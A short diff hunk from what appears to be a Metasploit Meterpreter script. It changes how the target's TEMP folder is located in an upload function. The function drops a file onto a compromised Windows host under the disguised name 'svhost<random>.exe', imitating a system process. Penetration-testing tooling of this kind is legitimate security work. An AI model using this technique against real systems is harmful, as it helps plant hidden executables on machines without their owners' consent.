@@ -179,7 +179,7 @@ end
 #---------------------------------------------------------------------------------------------------------
 
 def upload(session,file)
-  location = session.fs.file.expand_path("%TEMP%")
+  location = session.sys.config.getenv('TEMP')
   fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
   print_status("Uploading #{file}....")
   session.fs.file.upload_file("#{fileontrgt}","#{file}")
